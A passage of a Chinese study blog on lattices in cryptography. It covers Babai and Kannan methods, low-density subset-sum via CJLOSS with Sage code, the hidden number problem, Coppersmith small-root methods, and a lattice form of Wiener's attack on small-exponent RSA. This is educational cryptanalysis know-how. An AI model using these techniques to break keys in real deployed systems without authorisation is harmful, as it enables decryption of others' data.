inline">\(\pmb{t}&#39;&#39;=\pmb{t}&#39;-c_{n-1}\pmb{b}_{n-1}\)</span>，其中<span class="math inline">\(c_n=\lceil\langle\pmb{t}&#39;,\pmb{b}^*_{n-1}\rangle/\langle\pmb{b}^*_{n-1},\pmb{b}^*_{n-1}\rangle\rfloor\)</span>，以此类推，就可以得到完整的Babai最近平面算法： <img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202503311319585.png" alt="Pasted image 20250204163747" /></p><h4 id="kannan嵌入法">Kannan嵌入法</h4><p>Kannan嵌入法是通过将目标向量嵌入格基，从而将CVP转化为SVP进行求解，设输入的格基为<span class="math inline">\(\pmb{B}=\{\pmb{b}_1,\pmb{b}_2,\cdots,\pmb{b}_n\}\)</span>，而目标向量为<span class="math inline">\(\pmb{t}=(t_1,t_2,\cdots,t_n)\)</span>，我们设CVP的解为<span class="math inline">\(c_1\pmb{b}_1+c_2\pmb{b}_2+\cdots+c_n\pmb{b}_n\)</span>，即： <span class="math display">\[\pmb{t}\approx\sum_{i=1}^{n}c_i\pmb{b}_i\]</span> 也就有： <span class="math display">\[\pmb{t}=\sum_{i=1}^{n}c_i\pmb{b}_i+\pmb{e}\]</span> 其中<span class="math inline">\(||\pmb{e}||\)</span>很小，所以我们就可以构造出一个<span class="math inline">\(n+1\)</span>维的格： <span class="math display">\[\pmb{B}&#39;=\left(\begin{matrix}\pmb{B}&amp;0\\\pmb{t}&amp;q\end{matrix}\right)\]</span> 因为有： <span class="math display">\[(-c_1,-c_2,\cdots,-c_n,1)\pmb{B}&#39;=(\pmb{e},q)\]</span> 所以这个格显然包含短向量<span class="math inline">\((\pmb{e},q)\)</span>，由此我们就可以得到CVP的解为<span class="math inline">\(\pmb{t}-\pmb{e}\)</span>. 在这里，整数<span class="math inline">\(q\)</span>称为嵌入因子，它会影响到通过LLL算法寻找正确向量的成功率，应根据实际情况选取.</p><h2 id="格在密码学中的应用">格在密码学中的应用</h2><h3 id="背包问题knapsack-problem">背包问题（Knapsack Problem）</h3><p>背包问题是NP完全问题，其经常被用于作为公钥密码体系的陷阱门。在密码学中，背包问题的常见版本为子集和问题，即：给定<span class="math inline">\(n\)</span>个正数<span class="math inline">\(a_1,a_2,\cdots,a_n\)</span>与一个整数<span class="math inline">\(s\)</span>，寻找集合<span class="math inline">\(\{a_1,a_2,\cdots,a_n\}\)</span>的子集使得其和为<span class="math inline">\(s\)</span>。也就是找到<span class="math inline">\(e_1,e_2,\cdots,e_n\in\{0,1\}\)</span>使得： <span class="math display">\[s=\sum_{i=1}^{n}e_ia_i\]</span></p><h4 id="低密度子集和问题">低密度子集和问题</h4><p>集合<span class="math inline">\(\{a_1,a_2,\cdots,a_n\}\)</span>的密度<span class="math inline">\(d\)</span>可以通过下式计算： <span class="math display">\[d=\frac{n}{\log_2{\max_{i\in\{1,2,\cdots,n\}}(a_i)}}\]</span> 研究表明，当<span class="math inline">\(d&lt;0.9408\)</span>时，我们可以将子集和问题转换为求解SVP. 一般策略为构造一个格，其中有一个短向量包含<span class="math inline">\(\{e_1,e_2,\cdots,e_n\}\)</span>，这样我们就可以构造出下面的格基矩阵： <span class="math display">\[\pmb{B}=\left(\begin{matrix}1&amp;&amp;&amp;&amp;a_1\\&amp;1&amp;&amp;&amp;a_2\\&amp;&amp;\ddots&amp;&amp;\vdots\\&amp;&amp;&amp;1&amp;a_n\\&amp;&amp;&amp;&amp;s\end{matrix}\right)\]</span> 显然线性组合<span class="math inline">\((e_1,e_2,\cdots,e_n,-1)\)</span>会生成一个短向量<span class="math inline">\((e_1,e_2,\cdots,e_n,-1)\pmb{B}=(e_1,e_2,\cdots,e_n,0)\)</span>，所以我们的预期是通过LLL算法对上述格进行规约得到这个短向量，但是这个方法在密度比较高的时候会失效，所以Coster等人提出了CJLOSS算法，使得我们可以在<span class="math inline">\(d&lt;0.9408\)</span>的时候通过将子集和问题转换为SVP从而在多项式时间内求解这个问题，CJLOSS算法中构造的格为： <span class="math display">\[\pmb{B}&#39;=\left(\begin{matrix}1&amp;&amp;&amp;&amp;Na_1\\&amp;1&amp;&amp;&amp;Na_2\\&amp;&amp;\ddots&amp;&amp;\vdots\\&amp;&amp;&amp;1&amp;Na_n\\\frac{1}{2}&amp;\frac{1}{2}&amp;\cdots&amp;\frac{1}{2}&amp;Ns\end{matrix}\right)\]</span> 其中整数<span class="math inline">\(N&gt;\sqrt{n}\)</span>，在这个格内，线性组合<span class="math inline">\((e_1,e_2,\cdots,e_n,-1)\)</span>会生成另外一个短向量： <span class="math display">\[(e_1,e_2,\cdots,e_n,-1)\pmb{B}&#39;=(e_1-\frac{1}{2},e_2-\frac{1}{2},\cdots,e_n-\frac{1}{2},0)\]</span> 显然这条短向量的模为<span class="math inline">\(\frac{\sqrt{n}}{2}\)</span>，我们很容易可以通过LLL算法求解出这条短向量（这个短向量一般是规约后的格的第一个向量，且前<span class="math inline">\(n\)</span>个元素往往为<span class="math inline">\(\frac{1}{2}-e_i\)</span>）。 使用sage通过CJLOSS算法求解低密度子集和的代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">CJLOSS</span>(<span class="params">A, s</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(A)</span><br><span class="line">    N = ceil(sqrt(n))</span><br><span class="line">    L = matrix(QQ, n + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        L[i, i] = <span class="number">1</span></span><br><span class="line">        L[n, i] = <span class="number">1</span>/<span class="number">2</span></span><br><span class="line">        L[i, n] = N * A[i]</span><br><span class="line">    L[n, n] = N * s</span><br><span class="line">    res = L.LLL()</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(x <span class="keyword">in</span> [-<span class="number">1</span>/<span class="number">2</span>, <span class="number">1</span>/<span class="number">2</span>] <span class="keyword">for</span> x <span class="keyword">in</span> v[:-<span class="number">1</span>]):</span><br><span class="line">            out = [<span class="number">1</span>/<span class="number">2</span> - a <span class="keyword">for</span> a <span class="keyword">in</span> v[:-<span class="number">1</span>]]</span><br><span class="line">            <span class="keyword">return</span> out</span><br></pre></td></tr></table></figure> 例如，对于一个集合<span class="math inline">\(\{71, 73, 79, 107, 89, 91\}\)</span>，求出满足和为<span class="math inline">\(269\)</span>的一个子集，我们就可以通过CJLOSS算法进行求解（计算可得<span class="math inline">\(d=\frac{6}{\log_2{107}}\approx0.8900&lt;0.9408\)</span>）： <img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog202503311321632.png" alt="Pasted image 20250204213311" /> 所以可以得到和为<span class="math inline">\(269\)</span>的一个子集为<span class="math inline">\(\{73,107,89\}\)</span>.</p><h4 id="低密度多重子集和问题">低密度多重子集和问题</h4><p>通过对子集和问题的扩展，我们可以得到多重子集和问题：给定<span class="math inline">\(kn\)</span>个正整数<span class="math inline">\(a_{1,1},a_{1,2}\cdots,a_{k,n}\)</span>以及<span class="math inline">\(k\)</span>个整数<span class="math inline">\(s_1,\cdots,s_k\)</span>，找到<span class="math inline">\(e_1,e_2,\cdots,e_n\in\{0,1\}\)</span>满足对任意<span class="math inline">\(j\in{1,2,\cdots,k}\)</span>： <span class="math display">\[s_j=\sum_{i=1}^{n}e_ia_{j,i}\]</span> 实际上多重子集和问题总体与普通子集和问题差不多，但是集合更多，此时我们通过下式对密度<span class="math inline">\(d\)</span>进行计算： <span class="math display">\[d=\frac{n}{k\log_2{\max_{\begin{matrix}\end{matrix}}(a_{j,i})}}\]</span> 根据潘彦斌等人研究可以得出，当<span class="math inline">\(d&lt;0.9408\)</span>时，我们可以通过构造如下格来将低密度多重子集和问题转换为SVP进行求解： <span class="math display">\[\pmb{B}=\left(\begin{matrix}1&amp;&amp;&amp;&amp;0&amp;Na_{1,1}&amp;Na_{2,1}&amp;\cdots&amp;Na_{k,1}\\&amp;1&amp;&amp;&amp;0&amp;Na_{1,2}&amp;Na_{2,2}&amp;\cdots&amp;Na_{k,2}\\&amp;&amp;\ddots&amp;&amp;\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\&amp;&amp;&amp;1&amp;0&amp;Na_{1,n}&amp;Na_{2,n}&amp;\cdots&amp;Na_{k,n}\\\frac{1}{2}&amp;\frac{1}{2}&amp;\cdots&amp;\frac{1}{2}&amp;\frac{1}{2}&amp;Ns_1&amp;Ns_2&amp;\cdots&amp;Ns_k\end{matrix}\right)\]</span> 其中整数<span class="math inline">\(N&gt;\sqrt{\frac{n+1}{4}}\)</span>，此时在这个格内，线性组合<span class="math inline">\((e_1,e_2,\cdots,e_n,-1)\)</span>会生成一个短向量： <span class="math display">\[(e_1,e_2,\cdots,e_n,-1)\pmb{B}=(e_1-\frac{1}{2},e_2-\frac{1}{2},\cdots,e_n-\frac{1}{2},-\frac{1}{2},0,\cdots,0)\]</span> 通过LLL算法我们就可以得到这个短向量.</p><h4 id="低密度模子集和问题与低密度多重模子集和问题">低密度模子集和问题与低密度多重模子集和问题</h4><p>通过对子集和问题的扩充，我们可以得到模子集和问题：给定<span class="math inline">\(n\)</span>个模<span class="math inline">\(M\)</span>下的正整数<span class="math inline">\(a_1,a_2,\cdots,a_n\)</span>，再给出一个整数<span class="math inline">\(s\)</span>，找到<span class="math inline">\(e_1,e_2,\cdots,e_n\in\{0,1\}\)</span>，使得： <span class="math display">\[s\equiv\sum_{i=1}^{n}e_ia_i\pmod{M}\]</span> 从而可以推广为多重模子集和问题：给定<span class="math inline">\(kn\)</span>个模<span class="math inline">\(M\)</span>下的正整数<span class="math inline">\(a_{1,1},a_{1,2}\cdots,a_{k,n}\)</span>以及<span class="math inline">\(k\)</span>个整数<span class="math inline">\(s_1,\cdots,s_k\)</span>，找到<span class="math inline">\(e_1,e_2,\cdots,e_n\in\{0,1\}\)</span>满足对任意<span class="math inline">\(j\in{1,2,\cdots,k}\)</span>： <span class="math display">\[s_j\equiv\sum_{i=1}^{n}e_ia_{j,i}\pmod{M}\]</span> 实际上，模子集和问题问题可以视作<span class="math inline">\(k=1\)</span>的多重模子集和问题，我们可以通过下式对多重模子集和问题的密度<span class="math inline">\(d\)</span>进行计算： <span class="math display">\[d=\frac{n}{k\log_2M}\]</span> 根据潘彦斌等人研究可以得出，当<span class="math inline">\(d&lt;0.9408\)</span>且<span class="math inline">\(k=\omicron\left(\frac{n}{\log_2((n+1)\sqrt{n}+1)}\right)\)</span>时，我们可以通过构造如下格来将低密度多重模子集和问题转换为SVP进行求解： <span class="math display">\[\pmb{B}=\left(\begin{matrix}1&amp;&amp;&amp;&amp;0&amp;Na_{1,1}&amp;Na_{2,1}&amp;\cdots&amp;Na_{k,1}\\&amp;1&amp;&amp;&amp;0&amp;Na_{1,2}&amp;Na_{2,2}&amp;\cdots&amp;Na_{k,2}\\&amp;&amp;\ddots&amp;&amp;\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\&amp;&amp;&amp;1&amp;0&amp;Na_{1,n}&amp;Na_{2,n}&amp;\cdots&amp;Na_{k,n}\\&amp;&amp;&amp;&amp;&amp;NM&amp;&amp;&amp;\\&amp;&amp;&amp;&amp;&amp;&amp;NM&amp;&amp;\\&amp;&amp;&amp;&amp;&amp;&amp;&amp;\ddots&amp;\\&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;NM\\\frac{1}{2}&amp;\frac{1}{2}&amp;\cdots&amp;\frac{1}{2}&amp;\frac{1}{2}&amp;Ns_1&amp;Ns_2&amp;\cdots&amp;Ns_k\end{matrix}\right)\]</span> 使用LLL算法进行规约就可以得到目标短向量<span class="math inline">\((e_1-\frac{1}{2},e_2-\frac{1}{2},\cdots,e_n-\frac{1}{2},-\frac{1}{2},0,\cdots,0)\)</span>.</p><h3 id="隐藏数问题hidden-number-problemhnp">隐藏数问题（Hidden Number Problem，HNP）</h3><p>隐藏数问题的形式一般为给定一个质数<span class="math inline">\(p\)</span>，令<span class="math inline">\(\alpha\in[1,p-1]\)</span>作为“被隐藏的数字”，给定<span class="math inline">\(m\)</span>个数对<span class="math inline">\(\{(t_i,a_i)\}^{m}_{i=1}\)</span>使得： <span class="math display">\[\beta_i-t_i\alpha+a_i\equiv0\pmod{p}\]</span> 其中<span class="math inline">\(|\beta_i|&lt;K&lt;p\)</span>，我们需要从中恢复出<span class="math inline">\(\alpha\)</span>. 为解决这类问题，我们可以重写<span class="math inline">\(\beta_i-t_i\alpha+a_i\equiv0\pmod{p}\)</span>为<span class="math inline">\(\beta_i+a_i=t_i\alpha+k_ip\)</span>，这样我们就可以构造出下面的格： <span class="math display">\[\pmb{B}=\left(\begin{matrix}p&amp;&amp;&amp;&amp;\\&amp;p&amp;&amp;&amp;\\&amp;&amp;\ddots&amp;&amp;\\&amp;&amp;&amp;p&amp;\\t_1&amp;t_2&amp;\cdots&amp;t_m&amp;\frac{1}{p}\end{matrix}\right)\]</span> 对于向量<span class="math inline">\(\pmb{v}=(k_1,\cdots,k_m,\alpha)\)</span>有<span class="math inline">\(\pmb{v}\pmb{B}=(\beta_1+a_1,\cdots,\beta_m+a_m,\alpha/p)\)</span>，显然这个向量并不是很短，但是我们注意到： <span class="math display">\[\pmb{v}\pmb{B}=(a_1,\cdots,a_m,0)+(\beta_1,\cdots,\beta_m,\alpha/p)\]</span> 那么令<span class="math inline">\(\pmb{t}=(a_1,\cdots,a_m,0),\pmb{u}=(\beta_1,\cdots,\beta_m,\alpha/p)\)</span>，我们就可以得到： <span class="math display">\[\pmb{v}\pmb{B}-\pmb{t}=\pmb{u}\]</span> 其中<span class="math inline">\(||\pmb{u}||&lt;\sqrt{m+1}K\)</span>，显然我们可以通过将求解HNP转换为求解CVP，通过Kannan嵌入法，令嵌入因子为<span class="math inline">\(K\)</span>，我们就可以得到下面的格： <span class="math display">\[\pmb{B}&#39;=\left(\begin{matrix}p&amp;&amp;&amp;&amp;&amp;\\&amp;p&amp;&amp;&amp;&amp;\\&amp;&amp;\ddots&amp;&amp;&amp;\\&amp;&amp;&amp;p&amp;&amp;\\t_1&amp;t_2&amp;\cdots&amp;t_m&amp;\frac{K}{p}&amp;\\a_1&amp;a_2&amp;\cdots&amp;a_m&amp;&amp;K\end{matrix}\right)\]</span> 其包含向量<span class="math inline">\(\pmb{u}&#39;=(\beta_1,\cdots,\beta_m,K\alpha/p,-K)\)</span>，且<span class="math inline">\(||\pmb{u}&#39;||&lt;\sqrt{m+2}K\)</span>，<span class="math inline">\(\det(\pmb{B}&#39;)=p^{m-1}K^2\)</span>，显然有： <span class="math display">\[||\pmb{u}&#39;||&lt;\sqrt{m+2}K&lt;\left(\frac{2}{\sqrt{4\delta-1}}\right)^{m+1}\sqrt{m+2}|\det(\pmb{B}&#39;)|^{1/(m+2)}\]</span> 所以我们可以通过LLL来找到短向量<span class="math inline">\(\pmb{u}&#39;\)</span>，但是这个向量并不是最短的，因为格上存在另一个向量<span class="math inline">\((0,\cdots,0,K,0)\)</span>，它比<span class="math inline">\(\pmb{u}&#39;\)</span>更短，所以<span class="math inline">\(\pmb{u}&#39;\)</span>一般在规约后的第二个向量.</p><h4 id="扩展隐藏数问题extended-hidden-number-problemehnp">扩展隐藏数问题（Extended Hidden Number Problem，EHNP）</h4><p>通过对一般的隐藏数问题的扩展我们可以得到扩展隐藏数问题：给定素数<span class="math inline">\(p\)</span>，对整数<span class="math inline">\(x\in[1,p-1]\)</span>，有： <span class="math display">\[x=\overline{x}+\sum_{j=1}^{m}2^{\pi_{j}}x_j\]</span> 其中<span class="math inline">\(\overline{x}\)</span>以及<span class="math inline">\(\pi_j\)</span>均已知，而未知整数<span class="math inline">\(x_j\)</span>对于一个已知的整数<span class="math inline">\(\nu_j\)</span>满足<span class="math inline">\(0\le x_{j}&lt;2^{\nu_j}\)</span>，给出<span class="math inline">\(d\)</span>条方程： <span class="math display">\[\alpha_i\sum_{j=1}^{m}2^{\pi_j}x_j+\sum_{j=1}^{l_i}{\rho_{i,j}k_{i,j}}\equiv\beta_{i}-\alpha_i\overline{x}\pmod{p}\]</span> 其中对于<span class="math inline">\(1\le i\le d\)</span>，<span class="math inline">\(\alpha_i\not\equiv 0\pmod{p}\)</span>，<span class="math inline">\(\rho_{i,j}\)</span>以及<span class="math inline">\(\beta_i\)</span>均为已知的整数，未知正整数<span class="math inline">\(k_{i,j}\)</span>的上界为<span class="math inline">\(2^{\mu_{i,j}}\)</span>且<span class="math inline">\(\mu_{i,j}\)</span>已知，则扩展隐藏数问题（EHNP）则是通过上述条件恢复<span class="math inline">\(x\)</span>. 为解决EHNP，我们可以构造格： <span class="math display">\[\pmb{B}=\left(\begin{matrix}p\pmb{I}_d&amp;&amp;\\\pmb{A}&amp;\pmb{X}&amp;\\\pmb{R}&amp;&amp;\pmb{K}\end{matrix}\right)\]</span> 其中： <span class="math display">\[\begin{aligned}&amp;\pmb{A}=\left(\begin{matrix}\alpha_{1}2^{\pi_1}&amp;\alpha_{2}2^{\pi_1}&amp;\cdots&amp;\alpha_{d}2^{\pi_1}\\\alpha_{1}2^{\pi_2}&amp;\alpha_{2}2^{\pi_2}&amp;\cdots&amp;\alpha_{d}2^{\pi_2}\\\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\\alpha_{1}2^{\pi_m}&amp;\alpha_{2}2^{\pi_m}&amp;\cdots&amp;\alpha_{d}2^{\pi_m}\\\end{matrix}\right)\\&amp;\pmb{X}=diag\left(\frac{\delta}{2^{\nu_{1}}},\frac{\delta}{2^{\nu_{2}}},\cdots,\frac{\delta}{2^{\nu_{m}}}\right)\\&amp;\pmb{R}=\left(\begin{matrix}\rho_{1,1}&amp;&amp;\\\rho_{1,2}&amp;&amp;\\\vdots\\\rho_{1,l_1}&amp;&amp;\\&amp;\ddots&amp;\\&amp;&amp;\rho_{d,1}\\&amp;&amp;\rho_{d,2}\\&amp;&amp;\vdots\\&amp;&amp;\rho_{d,l_{d}}\end{matrix}\right)\\&amp;\pmb{K}=diag\left(\frac{\delta}{2^{\mu_{1,1}}},\cdots,\frac{\delta}{2^{\mu_{1,l_{1}}}},\cdots,\frac{\delta}{2^{\mu_{d,1}}},\cdots,\frac{\delta}{2^{\mu_{d,l_d}}}\right)\end{aligned}\]</span> 设<span class="math inline">\(L=l_1+l_2+\cdots+l_d\)</span>，<span class="math inline">\(D=d+m+L\)</span>，计算： <span class="math display">\[\kappa_{D}=\frac{2^{D/4}(m+L)^{1/2}+1}{2}\]</span> 通过<span class="math inline">\(\kappa_{D}\)</span>，我们可以得到<span class="math inline">\(\delta\)</span>满足<span class="math inline">\(0&lt;\delta\kappa_{D}&lt;1\)</span>。令 <span class="math display">\[\pmb{v}=(\beta_{1}-\alpha_{i}\overline{x},\cdots,\beta_{d}-\alpha_{d}\overline{x},\frac{\delta}{2},\cdots,\frac{\delta}{2})\]</span> 我们需要根据上述的<span class="math inline">\(\delta\)</span>构造格<span class="math inline">\(\mathcal{L}=\mathcal{L}(\pmb{B},\delta)\)</span>，在格<span class="math inline">\(\mathcal{L}\)</span>中找到向量<span class="math inline">\(\pmb{u}\)</span>使得： <span class="math display">\[||\pmb{u}-\pmb{v}||\le 2^{\frac{D}{4}}\min_{\pmb{t}\in\mathcal{L}}||\pmb{v}-\pmb{t}||\]</span> 通过LLL算法对我们构造的格进行规约可以得到： <span class="math display">\[\pmb{u}=\left(\beta_{1}-\alpha_{i}\overline{x},\cdots,\beta_{d}-\alpha_{d}\overline{x},\frac{x_1\delta}{2^{\nu_1}},\cdots,\frac{x_m\delta}{2^{\nu_m}},\frac{k_{1,1}\delta}{2^{\mu_{1,1}}},\cdots,\frac{k_{1,l_1}\delta}{2^{\mu_{1,l_{1}}}},\cdots,\frac{k_{d,1}\delta}{2^{\mu_{d,1}}},\cdots,\frac{k_{d,l_d}\delta}{2^{\mu_{d,l_d}}}\right)\]</span> 然后令<span class="math inline">\(x_{j}&#39;=\frac{1}{\delta}(\pmb{u}_{d+j}2^{\nu_{j}})\)</span>（<span class="math inline">\(1\le j\le m\)</span>），最后计算： <span class="math display">\[x&#39;=\overline{x}+\sum_{j=1}^{m}2^{\pi_j}x&#39;_{j}\mod{p}\]</span> 这样得到的<span class="math inline">\(x&#39;\)</span>就是我们需要的<span class="math inline">\(x\)</span>. 在论文<a href="https://link.springer.com/chapter/10.1007/978-3-540-74462-7_9">Extended Hidden Number Problem and Its Cryptanalytic Applications</a>中还提及了一种通过狄利克雷近似计算双洞隐藏数问题（Hidden Number Problem with Two Holes， HNP-2H），具体方法与步骤在<a href="https://triodelzx.github.io/2024/11/30/%E9%80%9A%E8%BF%87%E7%8B%84%E5%88%A9%E5%85%8B%E9%9B%B7%E8%BF%91%E4%BC%BC%E8%A7%A3%E5%86%B3HNP-2H/">通过狄利克雷近似解决HNP-2H | Triode Field</a>有写.</p><h3 id="coppersmith方法">Coppersmith方法</h3><h4 id="howgrave-graham定理">Howgrave-Graham定理</h4><p>设<span class="math inline">\(h(x_1,\cdots,x_n)\in\mathbb{Z}[x_1,\cdots,x_n]\)</span>是一个由<span class="math inline">\(\omega\)</span>个单项式组成的多项式，如果：</p><ol type="1"><li>存在<span class="math inline">\(|r_1|&lt;X_1,\cdots,|r_n|&lt;X_n\)</span>，有<span class="math inline">\(f(r_1,\cdots,r_n)\equiv0\pmod{N}\)</span></li><li><span class="math inline">\(||h(x_1X_1,\cdots,x_nX_n)||&lt;\frac{N}{\sqrt{\omega}}\)</span></li></ol><p>那么<span class="math inline">\(f(r_1,\cdots,r_n)=0\)</span>在整数域同样成立.</p><p>这个定理是Coppersmith方法的关键所在。</p><h4 id="一元coppersmith">一元Coppersmith</h4><p>对于度为<span class="math inline">\(k\)</span>的一元本原多项式<span class="math inline">\(p(x)=x^{k}+a_{k-1}x^{k-1}+\cdots+a_{1}x+a_{0}\in\mathbb{Z}[x]\)</span>，Coppersmith方法可以找到方程<span class="math inline">\(p(x)\equiv0\pmod{N}\)</span>（其中<span class="math inline">\(N\)</span>是一个合数）的一个小根<span class="math inline">\(x\equiv x_0\pmod{N}\)</span>（<span class="math inline">\(|x_{0}|&lt;X\)</span>，其中<span class="math inline">\(X\)</span>是一个自然数，且<span class="math inline">\(X\le N^{1/k}\)</span>） 这个算法的主要思想就是构造一个多项式<span class="math inline">\(h(x)\)</span>使得<span class="math inline">\(h(x_0)=0\)</span>，而求解<span class="math inline">\(h(x)=0\)</span>这个方程是很简单的，所以我们可以将求解<span class="math inline">\(p(x)\equiv0\pmod{N}\)</span>这一任务转化为求解<span class="math inline">\(h(x)=0\)</span>。我们可以构造格： <span class="math display">\[\pmb{B}=\left(\begin{matrix}N&amp;&amp;&amp;&amp;&amp;\\&amp;XN&amp;&amp;&amp;&amp;\\&amp;&amp;X^2N&amp;&amp;&amp;\\&amp;&amp;&amp;\ddots&amp;&amp;\\&amp;&amp;&amp;&amp;X^{k-1}N&amp;\\a_0&amp;a_1X&amp;a_2X^2&amp;\cdots&amp;a_{d-1}X^{d-1}&amp;X^{d}\end{matrix}\right)\]</span> 然后通过LLL规约得到一个矩阵： <span class="math display">\[\pmb{B}&#39;=\left(\begin{matrix}b_0&amp;b_1&amp;\cdots&amp;b_{d-1}&amp;b_{d}\\*&amp;*&amp;\cdots&amp;*&amp;*\\\vdots&amp;\vdots&amp;&amp;\vdots&amp;\vdots\\*&amp;*&amp;\cdots&amp;*&amp;*\end{matrix}\right)\]</span> 则有： <span class="math display">\[h(Xx)=b_dx^{d}+b_{d-1}x^{d-1}+\cdots+b_{1}x+b_0\]</span> 可以得到： <span class="math display">\[h(x)=\left(\frac{b_d}{X^d}\right)x^{d}+\left(\frac{b_{d-1}}{X^{d-1}}\right)x^{d-1}+\cdots+\left(\frac{b_1}{X}\right)x+b_0\]</span> 解该方程得到的整数解就有可能是我们要的<span class="math inline">\(x_0\)</span>。 在实际应用中，我们可以直接利用sage的<code>small_roots</code>来进行求解。</p><h4 id="多元coppersmith">多元Coppersmith</h4><blockquote><p>那堆东西暂时没看懂，先贴个从某些地方搜刮来的板子</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line">    B, monomials = G.coefficients_monomials()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line">    <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure><h3 id="一般维纳攻击的格方法">一般维纳攻击的格方法</h3><p><strong>维纳方法</strong>：对于<span class="math inline">\(N=pq\)</span>，假设<span class="math inline">\(\lambda({N})\)</span>与<span class="math inline">\(e\)</span>均与<span class="math inline">\(N\)</span>接近，而且解密指数<span class="math inline">\(d&lt;N^{1/4}\)</span>，那么因为<span class="math inline">\(e\)</span>与<span class="math inline">\(d\)</span>满足<span class="math inline">\(ed-k\lambda(N)=1\)</span>，所以令<span class="math inline">\(\lambda(N)=(p-1)(q-1)/g\)</span>，又令<span class="math inline">\(s=1-p-q\)</span>，就可以得到： <span class="math display">\[edg-kN=g+ks\]</span> 那么有： <span class="math display">\[\frac{e}{N}-\frac{k}{dg}=\frac{ks}{dgN}+\frac{1}{dN}\]</span> 由于<span class="math inline">\(e\approx N\)</span>，<span class="math inline">\(|s|\approx N^{1/2}\)</span>，那么可以得到<span class="math inline">\(\frac{k}{dg}\approx1\)</span>，所以上述方程的值约等于<span class="math inline">\(N^{-1/2}\)</span>，由勒让德定理，如果<span class="math inline">\(N^{-1/2}&lt;1/[2(dg)^2]\)</span>，那么<span class="math inline">\(\frac{k}{dg}\)</span>会是<span class="math inline">\(e/N\)</span>的渐进分数，所以我们可以通过连分数来得到<span class="math inline">\(d\)</span>，或者分解出<span class="math inline">\(p,q\)</span>，上述讨论中一般情况下<span class="math inline">\(g=1\)</span>。 令<span class="math inline">\(g=1\)</span>，实际上此时<span class="math inline">\(\lambda(N)=\varphi(N)\)</span>，我们注意到，在上述条件下得到的<span class="math inline">\(ed-kN=1+ks\)</span>一式存在线性关系，所以可以考虑使用格来求解，考虑构造如下格： <span class="math display">\[\pmb{B}=\left(\begin{matrix}1&amp;e\\0&amp;-N\end{matrix}\right)\]</span> 其中目标向量为<span class="math inline">\(\pmb{v}=(d,1+ks)\)</span>，其中<span class="math inline">\(s=1-p-q\)</span>，可以知道<span class="math inline">\(|s|\approx N^{1/2}\)</span>，<span class="math inline">\(d&lt;N^{1/4}\)</span>，则有<span class="math inline">\(|\det(\pmb{B})|=N\)</span>，可以知道 <span class="math display">\[||\pmb{v}||=\sqrt{d^2+(1+ks)^2}&gt;\sqrt{2}N^{1/2}&gt;\sqrt{2}|\det(\pmb{B})|^{1/2}\]</span> 显然，通过闵可夫斯基第一定理，我们几乎不可能通过规约得到我们的目标向量，那么我们要进行格基配平，根据分析，我们构造如下格： <span class="math display">\[\pmb{B}&#39;=\left(\begin{matrix}2^{\alpha}&amp;e\\0&amp;-N\end{matrix}\right)\]</span> （其中<span class="math inline">\(\alpha\)</span>是<span class="math inline">\(N\)</span>的比特数的<span class="math inline">\(1/2\)</span>），这样就可以通过LLL算法规约得到目标向量<span class="math inline">\((2^{\alpha}d,1+ks)\)</span>.</p>]]></content>
      
      
      <categories>
          
          <category> 密码学笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
